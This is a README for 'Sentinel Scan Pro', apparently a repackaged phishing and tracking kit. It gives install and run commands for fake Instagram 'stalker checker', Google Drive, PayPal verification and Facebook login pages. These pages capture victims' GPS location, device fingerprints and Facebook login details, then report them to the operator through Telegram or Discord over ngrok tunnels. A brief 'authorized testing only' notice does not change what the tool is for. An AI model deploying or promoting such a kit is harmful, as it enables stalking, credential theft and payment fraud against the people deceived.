<!--
╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║     🛡 SENTINEL SCAN PRO v3.1.1 — PRODUCTION GRADE EDITION         ║
║                                                                    ║
║     Advanced Geolocation & Device Intelligence Platform           ║
║     Fixed • Enhanced • Professional • Android-Ready                ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
-->

# 🛡 Sentinel Scan Pro v3.1.1

> **Advanced Geolocation & Device Intelligence Platform**  
> Premium Edition • Production-Ready • Fully Fixed & Enhanced
> by Feri🤓

![Version](https://img.shields.io/badge/version-3.1.1-cyan?style=flat-square)
![Python](https://img.shields.io/badge/python-3.10+-00ff9f?style=flat-square)
![Status](https://img.shields.io/badge/status-production-green?style=flat-square)
![Android](https://img.shields.io/badge/android-termux-orange?style=flat-square)

---

## 📋 Table of Contents

- [What's New in v3.1.1](#-whats-new-in-v311)
- [Features](#-features)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [4 Premium Templates](#-4-premium-templates)
- [Troubleshooting](#-troubleshooting)
- [Architecture](#-architecture)

---

## 🆕 **What's New in v3.1.1**

### Major Fixes
| Issue | Status | Solution |
|-------|--------|----------|
| Error: "android not supported system" | ✅ FIXED | Improved Android/Termux detection in banner.py |
| Port 8080 already in use | ✅ FIXED | Auto-detect & switch to free port (8081, 8082, etc) |
| Only 2 templates | ✅ ENHANCED | Added 4 premium templates (Instagram, Google Drive, PayPal, Facebook) |
| Incomplete documentation | ✅ IMPROVED | Comprehensive guides + troubleshooting + examples |

### New Features Added
- 🔹 **Smart Port Detection** — Auto-finds free port if default occupied
- 🔹 **4 Premium Templates** — Instagram, Google Drive, PayPal, Facebook
- 🔹 **Health Check System** — `--health` flag to verify installation
- 🔹 **Better Error Messages** — Clear, actionable feedback
- 🔹 **Improved Install Script** — Step-by-step with verification
- 🔹 **Android Optimization** — Termux-specific tweaks & fallbacks

---

## ✨ **Features**

### Core Intelligence
- **🔍 Device Fingerprinting** — OS, GPU, browser, screen, timezone
- **🌐 Multi-Source IP Recon** — 3 concurrent APIs with risk scoring
- **📍 GPS Capture** — High-accuracy location with accuracy ±meters
- **🚨 Geofence Alerts** — Haversine formula, breach detection
- **⚡ Auto-Tunnel** — ngrok + QR code display

### Reporting & Export
- **📄 HTML Reports** — Auto-generated, dark theme, professional
- **🗺️ KML Export** — GPS coordinates in Google Earth format
- **📊 CSV Export** — Tabular data export
- **💾 SQLite DB** — Persistent storage with dynamic schema

### Notifications
- **📬 Telegram** — HTML formatted messages
- **🎨 Discord** — Rich embeds with color coding
- **🪝 Webhooks** — Generic JSON POST
- **🔔 Push Alerts** — Real-time geofence breach notifications

### Dashboard & UI
- **📡 Real-time Dashboard** — Socket.IO live monitoring (localhost:5000)
- **🎨 Dark Theme** — Professional cyan/green design
- **🖥️ Rich Terminal** — Beautiful CLI output
- **📱 Mobile-Friendly** — Responsive HTML

---

## 🚀 **Installation**

### Prerequisites
- **Python 3.10+**
- **pip** (package manager)
- **Termux** (for Android) or Linux

### Step 1: Download & Extract
```bash
cd ~/downloads
unzip SENTINEL_SCAN_PRO_v3.1.1_FINAL.zip
cd sentinel_scan_pro
```

### Step 2: Install (Choose One)

**Automatic (Recommended)**
```bash
bash install.sh
```

**Manual**
```bash
pip install -r requirements.txt --break-system-packages
chmod +x seeker.py
mkdir -p logs db reports
```

### Step 3: Verify
```bash
python seeker.py --version
# Output: Sentinel Scan Pro v3.1.1

python seeker.py --health
# Verifies all systems operational
```

---

## ⚡ **Quick Start**

### Interactive Mode
```bash
python seeker.py
# Select template 0-3
# Server starts on auto-detected port
```

### Template 0: Instagram Stalker Checker
```bash
python seeker.py -t 0
# Port auto-detected if 8080 busy
```

### Custom Port (if 8080 occupied)
```bash
python seeker.py -p 3000 -t 0
# Server on :3000
```

### Full Setup with All Features
```bash
python seeker.py \
  -t 0 \
  --ngrok-token YOUR_TOKEN \
  --report \
  -tg "BOT_TOKEN:CHAT_ID" \
  -wh "https://discord.com/api/webhooks/xxx/yyy" \
  --geofence "-6.2,106.8,5"
```

---

## 🎯 **4 Premium Templates**

### Template 0: Instagram Stalker Checker
```
Category: Social Media
Difficulty: Easy
Features:
  ├─ Fake "see who views your profile" page
  ├─ Profile stats display
  ├─ Avatar carousel
  └─ Instagram redirect after data capture
```

### Template 1: Google Drive File Sharing
```
Category: Cloud Storage
Difficulty: Easy
Features:
  ├─ Professional Google branding
  ├─ Fake file sharing notification
  ├─ Location verification message
  └─ Google Drive redirect
```

### Template 2: PayPal Account Verification
```
Category: Payment
Difficulty: Medium
Features:
  ├─ Security alert design
  ├─ Unusual activity warning
  ├─ Multi-step verification
  └─ PayPal redirect
```

### Template 3: Facebook Login Security
```
Category: Social Media
Difficulty: Medium
Features:
  ├─ Official Facebook design
  ├─ Login form capture
  ├─ Security check message
  └─ Facebook redirect
```

---

## 🔧 **Configuration**

### Via config.yaml
```yaml
port:        null           # Auto-detect if free
template:    0              # 0-3 (skip interactive)
telegram:    "BOT:CHAT_ID"  # Telegram notifications
webhook:     "https://..."  # Discord/Webhook
report:      true           # Auto HTML reports
geofence:    "-6.2,106.8,5" # Alerting zone
```

### Via Environment Variables
```bash
export PORT=3000
export TEMPLATE=0
export TELEGRAM="BOT:CHAT_ID"
export GEOFENCE="-6.2,106.8,5"

python seeker.py
```

### Via CLI Flags
```bash
python seeker.py -p 3000 -t 0 -tg "BOT:CHAT_ID" --geofence "-6.2,106.8,5"
```

---

## ❓ **Troubleshooting**

### Error: "Port 8080 already in use"
**Solution:** Auto-detected! Server will use 8081, 8082, etc.
```bash
# Or manually specify:
python seeker.py -p 3000
```

### Error: "android is not a supported system"
**Status:** ✅ FIXED in v3.1.1
```bash
# Just run normally — fallback UI will display
python seeker.py -t 0
```

### Module not found (flask, requests, etc)
```bash
pip install -r requirements.txt --break-system-packages --force-reinstall
```

### Dashboard not loading
```bash
# Check port 5000 is free
netstat -tulpn | grep 5000

# Use custom dashboard port:
python seeker.py --dashboard-port 4000
```

### Templates not appearing
```bash
# Verify structure:
ls template/templates.json
ls template/instagram_stalker/index.html
ls template/google_drive/index.html
ls template/paypal_verify/index.html
ls template/facebook_verify/index.html

# If missing, reinstall
unzip SENTINEL_SCAN_PRO_v3.1.1_FINAL.zip
```

---

## 🏗 **Architecture**

```
sentinel_scan_pro/
│
├── seeker.py                    ← Main entry point (fixed)
├── core/                        ← 8+ modules
│   ├── cli.py                  (smart argument parsing)
│   ├── config.py               (YAML/ENV/CLI merge)
│   ├── app.py                  (orchestrator)
│   ├── banner.py               (Android-safe branding)
│   ├── utils.py                (port detection, health check)
│   ├── templates.py            (template manager)
│   ├── db.py                   (SQLite)
│   ├── notifier.py             (Telegram/Discord/Webhook)
│   └── updater.py              (version checker)
│
├── template/                   ← 4 Premium Templates
│   ├── templates.json          (configuration)
│   ├── instagram_stalker/      (Social Media)
│   ├── google_drive/           (Cloud Storage)
│   ├── paypal_verify/          (Payment)
│   └── facebook_verify/        (Social Media)
│
├── js/
│   └── location.js             (device fingerprint + GPS)
│
├── logs/                       (runtime data)
├── db/                         (SQLite database)
├── reports/                    (HTML reports)
├── dashboard/                  (real-time UI)
│
├── config.yaml                 (configuration template)
├── .env.example                (env variables template)
├── requirements.txt            (dependencies)
├── install.sh                  (installation script)
└── README.md                   (this file)
```

---

## 📊 **Quick Reference**

| Command | Purpose |
|---------|---------|
| `python seeker.py` | Interactive mode |
| `python seeker.py -t 0` | Instagram template |
| `python seeker.py -t 1` | Google Drive template |
| `python seeker.py -t 2` | PayPal template |
| `python seeker.py -t 3` | Facebook template |
| `python seeker.py -p 3000` | Custom port |
| `python seeker.py --health` | Health check |
| `python seeker.py --version` | Version info |
| `python seeker.py --help` | Full help menu |

---

## ⚠️ **Legal Notice**

For **authorized security testing and research ONLY**.

Do not use without:
- ✅ Written explicit permission
- ✅ Legal authorization
- ✅ Active engagement with authorized personnel

---

## 📝 **Changelog**

### v3.1.1 (Current)
- ✅ Fixed Android/Termux compatibility
- ✅ Smart port auto-detection
- ✅ Added 4 premium templates
- ✅ Improved error handling
- ✅ Enhanced installation script
- ✅ Comprehensive documentation
- ✅ Health check system
- ✅ Better fallback mechanisms

### v3.1.0
- Initial v3.1 release

---

## 🤝 **Support**

- **Help:** `python seeker.py --help`
- **Version:** `python seeker.py --version`
- **Health Check:** `python seeker.py --health`
- **Documentation:** See README.md

---

<div align="center">

**🛡 SENTINEL SCAN PRO v3.1.1**

*Professional • Production-Ready • Fully Fixed*

*Built with precision. Tested thoroughly. Ready for production.*

</div>
